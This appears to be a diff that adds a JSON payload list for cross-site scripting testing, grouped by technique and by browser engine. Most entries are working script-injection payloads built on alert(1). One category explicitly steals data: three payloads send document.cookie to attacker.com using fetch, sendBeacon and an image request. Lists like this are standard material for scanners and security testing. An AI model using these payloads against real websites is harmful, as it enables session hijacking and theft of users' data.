@@ -1,0 +1,94 @@
+[
+  {
+    "category": "Basic",
+    "description": "Simple XSS payloads that work in most contexts",
+    "browser_compatibility": ["chromium", "firefox", "webkit"],
+    "payloads": [
+      "<script>alert(1)</script>",
+      "<img src=x onerror=alert(1)>",
+      "<svg onload=alert(1)>"
+    ]
+  },
+  {
+    "category": "AttributeBreaking",
+    "description": "Payloads designed to break out of HTML attributes",
+    "browser_compatibility": ["chromium", "firefox", "webkit"],
+    "payloads": [
+      "\"><script>alert(1)</script>",
+      "';alert(1)//",
+      "\"-alert(1)-\""
+    ]
+  },
+  {
+    "category": "EventHandlers",
+    "description": "Payloads using various event handlers",
+    "browser_compatibility": ["chromium", "firefox", "webkit"],
+    "payloads": [
+      "<body onload=alert(1)>",
+      "<input autofocus onfocus=alert(1)>",
+      "<details open ontoggle=alert(1)>",
+      "<marquee onstart=alert(1)>"
+    ]
+  },
+  {
+    "category": "DataExfiltration",
+    "description": "Payloads designed to steal data",
+    "browser_compatibility": ["chromium", "firefox", "webkit"],
+    "payloads": [
+      "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
+      "<script>navigator.sendBeacon('https://attacker.com/steal', document.cookie)</script>",
+      "<script>new Image().src='https://attacker.com/steal?data='+encodeURIComponent(document.cookie)</script>"
+    ]
+  },
+  {
+    "category": "DOMBased",
+    "description": "Payloads targeting DOM-based XSS vulnerabilities",
+    "browser_compatibility": ["chromium", "firefox", "webkit"],
+    "payloads": [
+      "javascript:alert(1)",
+      "<iframe src=\"javascript:alert(1)\"></iframe>",
+      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+    ]
+  },
+  {
+    "category": "ElementSpecific",
+    "description": "Payloads targeting specific HTML elements",
+    "browser_compatibility": ["chromium", "firefox", "webkit"],
+    "payloads": [
+      "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
+      "<audio src=1 href=1 onerror=\"javascript:alert(1)\"></audio>",
+      "<video src=1 href=1 onerror=\"javascript:alert(1)\"></video>",
+      "<body src=1 href=1 onerror=\"javascript:alert(1)\"></body>",
+      "<image src=1 href=1 onerror=\"javascript:alert(1)\"></image>",
+      "<object src=1 href=1 onerror=\"javascript:alert(1)\"></object>",
+      "<script src=1 href=1 onerror=\"javascript:alert(1)\"></script>"
+    ]
+  },
+  {
+    "category": "ChromiumSpecific",
+    "description": "Payloads that work specifically in Chromium-based browsers",
+    "browser_compatibility": ["chromium"],
+    "payloads": [
+      "<script>eval.call`${\"alert(1)\"}`</script>",
+      "<script>setTimeout`alert(document.domain)`</script>"
+    ]
+  },
+  {
+    "category": "FirefoxSpecific",
+    "description": "Payloads that work specifically in Firefox",
+    "browser_compatibility": ["firefox"],
+    "payloads": [
+      "<script>new Function`alert(1)`</script>",
+      "<svg><set attributeName=\"onload\" to=\"alert(1)\" />"
+    ]
+  },
+  {
+    "category": "WebKitSpecific",
+    "description": "Payloads that work specifically in WebKit-based browsers",
+    "browser_compatibility": ["webkit"],
+    "payloads": [
+      "<div style=\"background-image:url(javascript:alert(1))\"></div>",
+      "<style>@keyframes x{}</style><div style=\"animation-name:x\" onanimationstart=\"alert(1)\"></div>"
+    ]
+  }
+]
